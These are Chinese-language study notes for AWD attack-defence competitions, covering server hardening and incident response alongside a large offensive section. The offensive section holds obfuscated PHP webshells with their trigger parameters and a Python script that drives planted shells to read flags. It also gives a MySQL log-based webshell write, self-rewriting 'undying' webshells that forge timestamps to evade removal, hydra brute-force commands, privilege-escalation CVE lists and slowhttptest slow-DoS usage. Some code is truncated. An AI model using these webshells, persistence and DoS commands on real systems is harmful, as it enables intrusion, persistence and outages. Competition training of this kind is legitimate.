/proc/sys/net/ipv4/icmp_echo_ignore_all //关闭禁ping 2.2# Web安全加固 2.2.1 备份源码 防止在对源码进行修改时出问题，或者被攻击方删除源码而准备 压缩源码： tar -cvf web.tar /var/www/html zip -q -r web.zip /var/www/html 解压缩源码： tar -xvf web.tar -c /var/www/html unzip web.zip -d /var/www/html 备份源码： mv web.tar /tmp mv web.zip /home/xxx 上传和下载源码： scp username@servername:/path/filename /tmp/local_destination //从服务器下载单个文件到本地 scp /path/local_filename username@servername:/path //从本地上传单个文件到服务器 scp -r username@servername:remote_dir/ /tmp/local_dir //从服务器下载整个目录到本地 scp -r /tmp/local_dir username@servername:remote_dir //从本地上传整个目录到服务器 2.2.2 设置只读权限 对Web文件设置只读和执行权限（PHP等动态语言需要执行权限） chmod 0555 /var/www/html/* chmod 0555 /var/www/html/*.php Web根目录设置只读和执行权限 chmod 0555 /var/www/html 改变文件的属主和属组来设置严格的权限 chown -R root:root /var/www/html/ //设置拥有人为 root:root 或 httpd:httpd (推荐) chown -R apache:apache /var/www/html/ //确保 apache 拥有 /var/www/html/ 2.2.3 配置 .htaccess 利用 .htaccess 配置文件禁止php文件执行 //指定目录后续的指令将应用于该目录 Options -ExecCGI -Indexes //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。 AllowOverride None //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。 RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml //这两个指令移除指定文件扩展名的处理器和类型。 //在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。 php_flag engine off //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。 deny from all //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有 2.2.4 PHP参数安全配置 首先找到PHP的配置文件 /etc/php/{version}/php.ini 禁用高危函数 disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link 配置 open_basedir （将用户访问文件的活动范围限制在指定的区域） open_basedir=/var/www/html 禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入） magic_quotes_gpc = Off 关闭PHP伪协议 allow_url_fopen = Off allow_url_include = Off 重启PHP sudo service php7.0-fpm restart sudo systemctl restart php7.0-fpm.service 2.3# 数据库安全加固 2.3.1 Mysql加固 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456 不使用默认口令，修改成复杂的，并确保和web环境连接 设置只允许本地127.0.0.1账户登录：修改 bind-address=127.0.0.1 ；在配置文件中加入 seccure_file_priv=NULL 开启日志审计功能：general_log_file=路径 因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令 备份指定数据库： mysqldump -u username -p password databasename > target.sql 备份所有数据库： mysqldump -all -databases > all.sql 导入数据库： mysql -u username -p password database 对于MySQL的攻防，可以看这篇文章：https://blog.zgsec.cn/archives/26.html MySQL默认配置文件路径： C:\\\\Program Files\\MySQL\\MySQLServer 5.1\\my.ini //Windows /etc/my.cnf //Linux /etc/mysql/my.cnf //Linux 修改 secure_file_priv 参数（日志功能的对应目录） secure_file_priv=\"\" 重载MySQL配置 FLUSH PRIVILEGES 重启MySQL服务 sudo service mysql restart sudo systemctl restart mysql 2.3.2 Mssql加固 删除不必要的账号 SQLServer用户口令安全 根据用户分配帐号避免帐号共享 分配数据库用户所需的最小权限 网络访问限制 SQLServer登录审计 SQLServer安全事件审计 配置日志功能 2.4# 远程控制加固 2.4.1 SSH安全加固 限制IP登录方法 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 AllowUsers username@192.168.0.100 //找到并编辑以下行，确保其取消注释并设置为所需的IP地址 禁用 root 远程登录 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 PermitRootLogin no //将PermitRootLogi设置为“no” 按用户和组限制SSH登录 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 AllowUsers testuser //设置只允许 testuser 登录SSH AllowUsers testuser@192.168.1.100 //设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH AllowGroups test //设置用户组白名单 //需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录 重启SSH服务 sudo service sshd restart sudo systemctl restart sshd.service 2.4.2 RDP远程登录安全加固 删除默认帐户并手动添加新用户： 步骤1：按 Win + R 打开运行对话框，输入 secpol.msc 并单击 “确定” 步骤2：导航至此处：本地策略-->用户权限分配，再双击打开 “允许通过远程桌面服务登录” 步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组） 步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户 更改默认RDP端口号： 步骤1：打开运行对话框，输入 regedit 并单击 “确定” 步骤2：打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp ，向下滚动并找到 PortNumber 然后双击它 步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定” 2.5# 应急响应 2.5.1 查询进程线程 netstat ps -aux netstat -apt 2.5.2 杀掉进程 kill -9 pid //Linux上 taskkill /f /pid pid //Windows上 2.5.3 搜索WebShell文件 find /var/www/html -name *.php -mmin -5 //查看最近5分钟修改文件 find ./ -name '*.php' | xargs wc -l | sort -u //寻找行数最短文件，一般有可能是一句话木马 grep -r --include=*.php '[^a-z]eval($_POST' /var/www/html //查包含关键字的php文件 find /var/www/html -type f -name \"*.php\" | xargs grep \"eval(\" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串\"eval(\"的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看 2.5.4 查杀不死马 也可以利用命令自动进行查找删除 ps -aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9 然后重启服务 service php-fpm restart 2.5.5 杀弹反弹shell 老规矩查看进程 ps -ef px -aux ps -aux | grep www-data 注意 www-data 权限的 /bin/sh，很有可能是nc 再就是上老一套命令 kill ps -aux | grep www-data | grep apache2 | awk '{print $2}' 3# 自由攻击环节（Attack） 3.0# 主要准备内容 各类CMS软件包最新版准备 扫描工具：Nmap、Nessus、Metasploit更新 漏洞利用脚本Poc、Exp 3.1# 基本信息搜集 3.1.1 主机信息搜集 Nmap nmap -sn 192.168.0.0/24 //C段存活扫描 httpscan httpscan.py 192.168.0.0/24 -t 10 //C段存活扫描 3.1.2 端口扫描 nmap -sV 192.168.0.2 //扫描主机系统版本 nmap -sS 192.168.0.2 //扫描主机常用端口 nmap -sS -p 80,445 192.168.0.2 //扫描主机部分端口 nmap -sS -p- 192.168.0.2 //扫描主机全部端口 Python脚本 import requests for x in range(2,255): url = \"http://192.168.1.{}\".format(x) try: r = requests.post(url) print(url) except: pass 3.2# 外部打点 3.2.0 常见系统漏洞 MS17-010（永恒之蓝，可看https://blog.zgsec.cn/archives/172.html） MySQL进行UDF提权（SQL注入或者MySQL弱口令） MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令） SSH弱口令或默认口令 PWN（这个要看具体AWD比赛提供的内容了） 3.2.1 中间件漏洞 IIS（解析漏洞、远程代码执行） Apache（解析漏洞） Nginx（解析漏洞） Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501） Mysql（弱口令） Tomcat（弱口令Getshell） Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883） SpringBoot（未授权访问漏洞和RCE漏洞，具体可看https://blog.zgsec.cn/archives/129.html） 3.2.2 集成服务环境漏洞 wampserver xamppserver 3.2.3 CMS漏洞利用 搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS： Aspcms Dedecms Dicuz Drupal Empirecms Eshop Finecms Joomla Lamp Metainfo Phpcms Phpwind Qibocms Seacms Semcms ThinkPHP Wolfcms Wordpress Zabbix 备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破 3.2.4 上传WebShell 常见一句话木马 PHP： Aspx： Get型木马 免杀马制作：https://github.com/AabyssZG/WebShell-Bypass-Guide /'^'{{{{';@${$_}[_](@${$_}[__]); //执行GET传参 ?_=system&__=whoami 来执行whoami命令 /'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]); //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell 隐藏的文件读取 条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现 3.2.5 利用WebShell curl(跟hackbar差不多) C:\\Users\\admin>curl \"http://192.168.182.130:8801/include/shell.php\" -d \"admin_ccmd=system('cat /f*');\" //向shell.php文件里传入参数并返回结果 Python多端口传参 #coding=utf-8 import requests url_head=\"http://192.168.182.130\" #网段 url=\"\" shell_addr=\"/upload/url/shell.php\" #木马路径 passwd=\"pass\" #木马密码 #port=\"80\" payload = {passwd: 'System(\\'cat /flag\\');'} # find / -name \"flag*\" #清空上次记录 flag=open(\"flag.txt\",\"w\") flag.close() flag=open(\"flag.txt\",\"a\") for i in range(8000,8004): url=url_head+\":\"+str(i)+shell_addr try: res=requests.post(url,payload)#,timeout=1 if res.status_code == requests.codes.ok: result = res.text print (result) flag.write(result+\"\\n\") else: print (\"shell 404\") except: print (url+\" connect shell fail\") flag.close() 3.2.6 MySQL数据库利用 具体可以看这篇文章：https://blog.zgsec.cn/archives/26.html 1、查看MySQL版本 show variables like '%version%'; select version(); #这个只显示MySQL版本号 2、查看 load_file() 开启状态 show variables like '%secure%'; #这条可查看详细信息 show global variables like '%secure_file_priv%'; 3、查看日志功能是否开启和对应目录 SHOW VARIABLES LIKE 'general%'; set global general_log = \"ON\"; set global general_log_file='/var/www/html/test.php'; #可以写入WebShell然后直接连接蚁剑 # 往日志里面写入 WebShell select ''; # 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现 小技巧：获取MySQL账户和对应密码Hash # MySQL = 5.7 版本 select host,user,authentication_string from mysql.user; 3.2.7 弱口令爆破 爆破SSH密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40 //40是⽬标服务开放的端⼝ 爆破FTP密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/ 爆破RDP远程桌面密码 hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V 爆破Telnet hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V 爆破MSSQL数据库 hydra -l sa -P 密码字典.txt 目标IP地址 mssql 爆破MySQL数据库 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql 3.3# 内网渗透 3.3.1 权限维持之不死马 简单不死马： '); //创建shell.php sleep(0); //间隔时间 } 可以通过不断复写 shell.php 来达到该木马难以被使用的效果 防连接不死马： '); //创建shell.php sleep(0); } //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 进阶不死马： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2020-12-01 09:10:12\" shell.php'); //修改时间，防止被删 usleep(5000); } ?> //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell.php 的WebShell文件 双重不死马： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2020-12-01 18:10:12\" .login.php'); file_put_contents($file1,$code); system('touch -m -d \"2020-12-01 18:10:12\" /admin/.register.php'); usleep(5000); } ?> //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 浏览器访问写入的WebShell，会自动生成两个不死马： .login.php 和 /admin/.register.php 3.3.2 关键文件检索 组件检索 find / -name \"apaech2.conf\" //检索Apache主配置文件 find / -name \"nginx.conf\" //检索Nginx目录 find / -path \"*nginx*\" -name nginx*conf //检索Nginx配置目录 find / -name \"httpd.conf\" //检索Apache目录 find / -path \"*apache*\" -name apache*conf //检索Apache配置目录 网站首页 find / -name \"index.php\" //定位网站目录 find / -name \"index.html\" //定位网站目录 日志文件检索 /var/log/nginx/ //默认Nginx日志目录 /var/log/apache/ //默认Apache日志目录 /var/log/apache2/ //默认Apache日志目录 /usr/local/tomcat/logs //Tomcat日志目录 tail -f xxx.log //实时刷新滚动日志文件 3.3.3 Linux提权 查询系统版本信息命令： cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release 查询内核版本信息命令： uname -a uname -mrs cat /proc/version cat /etc/issue lsb_release -a hostnamectl rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz 查看系统环境变量命令： cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 查看语言环境信息命令： find / -name perl* find / -name python* find / -name gcc* find / -name cc set 查看文件上传环境信息命令： find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 这里列举一些可用利用的提权漏洞： CVE-2023-0386（Linux OverlayFS权限提升漏洞） CVE-2021-4034（Linux Polkit本地权限提升漏洞） CVE-2017-6074 （DCCP双重释放漏洞 > 2.6.18 ） CVE-2016-5195（脏牛，kernel 2.6.22 CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8） CVE-2017-1000367（sudo本地提权漏洞 ） CVE-2016-1247（Nginx权限提升漏洞） CVE-2017-16995（Ubuntu16.04 kernel:4.14-4.4） Kali命令查询： searchsploit CentOS 7 searchsploit Ubuntu 16.04 提权Exploit寻找： http://www.exploit-db.com http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main 编译提权Exp gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall 直接提权，确认权限： cat /etc/shadow 其他提权姿势：https://www.freebuf.com/articles/system/244627.html 3.3.4 Windows提权 这里列举一些Windows的漏洞： 各种Potato（Github上面基本都有） CVE-2023-35359（Windows内核权限提升漏洞，开源了） CVE-2022-24521（没有Exp的可以找我要） CVE-2019-1405 CVE-2019-1322 MS17-017（整型溢出漏洞） 4# 参考链接 http://freebuf.com/ https://blog.zgsec.cn/ https://paper.seebug.org/3044/ https://www.anquanke.com/ https://www.exploit-db.com/ http://www.bugscan.net/source/template/vulns/ https://xz.aliyun.com/t/12687 5# 感谢各位师傅🙏 Stargazers Forkers 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 17:04 "},"3.网络安全/AWD/slowhttptest.html":{"url":"3.网络安全/AWD/slowhttptest.html","title":"Slowhttptest","keywords":"","body":"slowhttptest慢速攻击工具使用详解 参考文章 浅谈“慢速HTTP攻击Slow HTTP Attack” HTTP慢速攻击 Slowhttptest攻击原理 InstallationAndUsage 本片文章仅供学习使用，切勿触犯法律！ 一、简要介绍 SlowHTTPTest是一款对服务器进行慢攻击的测试软件，所谓的慢攻击就是相对于cc或者DDoS的快而言的，并不是只有量大速度快才能把服务器搞挂，使用慢攻击有时候也能到达同一效果。slowhttptest包含了之前几种慢攻击的攻击方式，包括slowloris, Slow HTTP POST, Slow Read attack等。那么这些慢攻击工具的原理就是想办法让服务器等待，当服务器在保持连接等待时，自然就消耗了资源。 二、下载安装 Kali Linux： apt-get install slowhttptest 其他Linux发行版： tar -xzvf slowhttptest-x.x.tar.gz cd slowhttptest-x.x ./configure --prefix=PREFIX make sudo make install PREFIX替换为应该安装slowhttptest工具的绝对路径。 需要安装libssl-dev才能成功编译该工具。 MacOS安装命令： brew update && brew install slowhttptest git安装： git clone https://github.com/shekyan/slowhttptest 三、执行使用 默认参数测试 ./slowhttptest 其回应的相关参数： test type 测试类型 number of connections 连接数 URL 网址 verb 动词 interval between follow up data 随机数据之间的间隔 connections per second 每秒连接数 test duration 测试时间 probe connection timeout 探针连接超时 max length of followup data field 后续数据字段的最大长度 1、参数说明 选项 描述 -a 开始 用于范围标头测试的range-specifier的起始值 -b 字节 范围标题测试的范围说明符限制 -c 连接数 限于65539 -d 代理主机：端口 通过Web代理定向所有流量 -e 代理主机：端口 用于仅通过Web代理定向探测流量 -H，B，R或X 指定在标头部分或消息正文中放慢速度，-R启用范围测试，-X启用慢速读取测试 -f 内容类型 内容类型标头的值 -g 生成CSV和HTML格式的统计信息，格式为slow_xxx.csv / html，其中xxx是时间和日期 -i 秒 每个连接的后续数据之间的间隔（以秒为单位） -j cookie Cookie标头的值（例如：-j“ user_id = 1001；超时= 9000”） -k 流水线系数 如果服务器支持HTTP管道，则在同一连接中重复请求以进行慢速读取测试的次数。 -l 秒 测试持续时间（以秒为单位） -m 接受 Accept标头的值 -n 秒 从接收缓冲区读取操作之间的间隔 -o 文件 定制输出文件的路径和/或名称，如果指定了-g，则有效 -p 秒 等待探针连接上的HTTP响应超时，此后服务器被视为不可访问 每秒-r个连接 连接率 -s 字节 如果指定了-B，则Content-Length标头的值 -t 动词 要使用的自定义动词 -u URL 目标URL，与您在浏览器中键入的格式相同，例如http s：// host [：port] / -v 级 日志0-4的详细级别 -w 字节 范围的开始，将从中选择广告窗口大小 -x 字节 随访数据的最大长度 -y 字节 范围的末端，将从中选择广告窗口大小 -z 字节 通过单个read（）操作从接收缓冲区读取的字节 2、功能命令 slowloris模式： slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3 Slow Body攻击： 慢消息正文模式下的用法示例 slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://www.mywebsite.com -x 10 -p 3 Slow Read模式： slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://yourtarget.co 慢节奏模式下的用法示例： ./slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://myseceureserver/resources/index.html -x 24 -p 3 通过在xxxx：8080上的代理进行探测： ./slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://someserver/somebigresource -p 5 -l 350 -e x.x.x.x:8080 3、错误信息 错误信息 这是什么意思 \"Hit test time limit\" 程序达到了用-l参数指定的时间限制 \"No open connections left\" 同行关闭了所有连接 \"Cannot establish connection\" 在测试的前N秒内未建立任何连接，其中N是-i参数的值，或者是10（如果未指定）。如果没有到主机的路由或远程对等体断开，则会发生这种情况 \"Connection refused\" 远程对等方不接受指定端口上的连接（仅来自您？使用代理进行探测） \"Cancelled by user\" 您按了Ctrl-C或以其他方式发送了SIGINT \"Unexpected error\" 永远不会发生 3、判断依据 当服务器可控，可以通过以下命令来确认是否存在该漏洞： pgrep http | wc -l 进程数量 netstat -antp | grep 443 | wc -l 网络连接数量 在攻击的时间段，服务无法正常访问则存在漏洞。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/主机端口探测.html":{"url":"3.网络安全/AWD/主机端口探测.html","title":"主机端口探测","keywords":"","body":"主机探测 一般使用nmap或httpscan 查看自己主机IP： ifconfig #Linux ipconfig #Windows 扫描C段存活： namp -sn 192.168.0.0/24 #扫描C段主机存活 httpscan.py 192.168.0.0/24 –t 10 #扫描C段主机存活 端口探测 一般先搜集自己的主机端口信息，比赛主机开放端口情况大多情况一致，然后类比指定扫描其他主机端口信息，最后挂后台全端口扫描防止端口遗漏！ nmap -sV 192.168.0.2 #扫描主机系统版本 nmap -sS 192.168.0.2 #扫描主机常用端口 nmap -sS -p 80,445 192.168.0.2 #扫描主机部分端口 nmap -sS -p- 192.168.0.2 #扫描主机全部端口 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/信息修改.html":{"url":"3.网络安全/AWD/信息修改.html","title":"信息修改","keywords":"","body":"1、修改密码 SSH口令 #ssh修改 passwd 数据库密码修改（记得同步修改网站数据库配置） 1.登录：mysql -u root -p password 2.选择数据库：use mysql; 3.更改密码：set password for '用户名'@'localhost' = password('4f31b4qscWEmc71NJJU'); 4.刷新权限：flush privileges; exit; 或 mysqladmin -u user -p 123456 password 4f31b4qscWEmc71NJJU 2、关闭 MySQL 远程登录（有些比赛会检查这个的check，建议慎用） mysql -u root -p mysql> use mysql; mysql> update user set host = 'localhost' where user='root' and host='%'; mysql> flush privileges; mysql> exit; WEB服务口令(后台密码) 配置文件方式的后台密码 find /var/www/html -path 'config' #查找配置文件中的密码凭证 数据库后台管理员密码 mysql -u root -p show databases; use dataname; show tables; select * from admin; updata admin set user pass=’4f31b4qscWEmc71NJJU’; //updata 表名 set 字段名 = ‘值’; flush privileges; 账号用户检查 SSH 检查/etc/passwd文件：是否有/bin/bash的用户 cut -d : -f 1 /etc/passwd cat /etc/shadow 使用usermod命令禁用可疑用户： usermod -L 用户名 删除 userdel -r 用户名 MYSQL 删除多余的账号 登录MySQL数据库 mysql -u root -p password 查询所有用户： SELECT DISTINCT CONCAT('User: ''', user, '''@''', host, ''';') AS query FROM mysql.user; 1 删除用户： DROP USER user1, user2, user3; 确保将user1, user2, user3替换为实际的用户名列表。 刷新权限： FLUSH PRIVILEGES; 2.dump源码（方便应急响应恢复靶机） 网站源码备份 使用ssh工具保留源码，复制两份，用d盾去扫一份 防止在对源码进行修改时出问题，或者被攻击方删除源码而准备 压缩源码： tar -cvf web.tar /var/www/html zip -q -r web.zip /var/www/html 解压缩源码： tar -xvf web.tar -c /var/www/html unzip web.zip -d /var/www/html 备份源码： mv web.tar /tmp mv web.zip /home/xxx 上传和下载源码： scp username@ip:/path/filename /tmp/local_destination //从服务器下载单个文件到本地 scp /path/local_filename username@ip:/path //从本地上传单个文件到服务器 scp -r username@ip:remote_dir/ /tmp/local_dir //从服务器下载整个目录到本地 scp -r /tmp/local_dir username@ip:remote_dir //从本地上传整个目录到服务器 数据备份 php网站数据库配置信息为 config.php/web.conf php.ini文件、postgresql.conf、settings.py、mongod.conf、web.config 备份指定数据库 mysqldump –u username –p password databasename > bak.sql 备份所有数据库 mysqldump –all -databases > bak.sql 导入数据库 mysql – u username – p password database 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/加固.html":{"url":"3.网络安全/AWD/加固.html","title":"加固","keywords":"","body":"慢Dos攻击修复（slowhttptest） Apache: httpd.conf下启用mod_reqtimeout模块 去掉LoadModule reqtimeout_module modules/mod_reqtimeout.so前面的#号 增加以下配置： RequestReadTimeout header=5-40,MinRate=500 body=20,MinRate=500 重启apache，工具扫描确认漏洞是否修改完成。 Nginx: 关闭慢速连接 server { client_body_timeout 5s; #NGINX在客户机体写入之间等待的时间 client_header_timeout 5s; #NGINX在写入客户机标题之间等待的时间 limit_conn perserver 300;#限制当前站点最大并发数 limit_conn perip 25;#限制单个IP访问最大并发数 limit_rate 512k;#限制每个请求的流量上限（单位：KB） # ... } 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/定时备份源码.html":{"url":"3.网络安全/AWD/定时备份源码.html","title":"定时备份源码","keywords":"","body":"#!/bin/bash while [ 1 ] do time=`/bin/date +%H-%M-%S` bak_file=\"/var/www/$time.tar.gz\" webdir=\"/var/www/html\" tar zcvf $bak_file $webdir >/dev/null 2>&1 & # 每个一分钟备份 sleep 60 done 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/弱口令爆破.html":{"url":"3.网络安全/AWD/弱口令爆破.html","title":"弱口令爆破","keywords":"","body":"爆破SSH密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40 //40是⽬标服务开放的端⼝ 爆破FTP密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/ 爆破RDP远程桌面密码 hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V 爆破Telnet hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V 爆破MSSQL数据库 hydra -l sa -P 密码字典.txt 目标IP地址 mssql 爆破MySQL数据库 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/数据库信息修改.html":{"url":"3.网络安全/AWD/数据库信息修改.html","title":"数据库信息修改","keywords":"","body":"数据库密码修改 mysql -u root -p Show databases; use mysql; set password for root@localhost = password('d1fd2i64m527bd4B'); 或者 update user set password = PASSWORD('d1fd2i64m527bd4B') where user = 'root'; flush privileges; show tables; # 可能有flag。 select * from typecho_flag; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/服务配置文件探测.html":{"url":"3.网络安全/AWD/服务配置文件探测.html","title":"服务配置文件探测","keywords":"","body":"应用发现 apaech2.conf是主配置文件，不是真正的具体配置文件，它只是把各 个零散的配置文件以inluceding方式包含进来，如下图所示： 组件发现： find / -name \"nginx.conf\" #定位nginx目录 find / -path \"*nginx*\" -name nginx*conf #定位nginx配置目录 find / -name \"httpd.conf\" #定位apache目录 find / -path \"*apache*\" -name apache*conf #定位apache配置目录 网站发现： find / -name \"index.php\" #定位网站目录 日志发现： /var/log/nginx/ #默认Nginx日志目录 /var/log/apache/ #默认Apache日志目录 /var/log/apache2/ #默认Apache日志目录 /usr/local/tomcat/logs #Tomcat日志目录 tail -f xxx.log #实时刷新滚动日志文件 以上是定位常见文件目录的命令或方法，比赛需要根据实际情况类推，善用find命令！ 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/浅谈AWD攻防赛的生存攻略.html":{"url":"3.网络安全/AWD/浅谈AWD攻防赛的生存攻略.html","title":"浅谈AWD攻防赛的生存攻略","keywords":"","body":"浅谈AWD攻防赛的生存攻略 AWD 规则 AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。 1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）； 2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）； 3.flag在主办方的设定下每隔一定时间刷新一轮； 4.各队一般都有一个初始分数； 5.flag一旦被其他队伍拿走，该队扣除一定积分； 6.得到flag的队伍加分； 7.一般每个队伍会给一个低权限用户，非root权限； 8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。 # 前期准备 ## SSH登录 口令登录 命令格式为： ssh 客户端用户名@服务器ip地址 ssh 用户名@ip ssh ctf@192.168.182.130 如果不是默认的22端口，也可以使用 -p 选项来修改端口号，比如连接到服务器的2222端口 ssh -p 指定端口号 用户名@ip ssh -p 2222 ctf@192.168.182.130 除此之外还可以使用Finalshell或者Xshell等图形化服务器管理软件 密钥登录 用id_rsa用于登陆靶机，命令如下 sftp -i id_rsa ctf@192.168.182.130 改密码 官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。 如果发现每个队伍的SSH账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就gg了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。 SSH密码修改: passwd mysql密码修改: #方法一 show databases; use mysql set password for root@localhost = password('123'); #方法二 update user set password = PASSWORD('需要更换的密码') where user='root'; flush privileges; show tables; Web后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell。 备份源码 比赛开始后第一时间备份服务器中web目录下的文件(/var/www/html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的WWW下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了 比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。 1.目录打包 打包 tar -zcvf archive_name.tar.gz directory_to_compress 注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包 备份整站 cd /var/www && tar -czvf /tmp/html.tgz html # 软连接到了/app cd / && tar -czvf /tmp/app.tgz app 解包 tar -zxvf archive_name.tar.gz 2.备份数据库 备份指定的多个数据库 mysqldump -uroot -proot --databases DB1 DB2 > /tmp/db.sql 无 lock tables 权限的解决方法 mysqldump -uroot -proot --all-databases --skip-lock-tables > /tmp/db.sql 恢复备份（在 MySQL 终端下执行） source FILE_PATH 重置 MySQL 密码（在 MySQL 终端下执行） 方法 1 set password for 用户名@localhost = password(\"新密码\") 方法 2 mysqladmin -u用户名 -p旧密码 password 新密码 3.下载到本地 scp -P ssh_port user@host_ip:/tmp/bak.sql local_file 查找预留后门 用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。 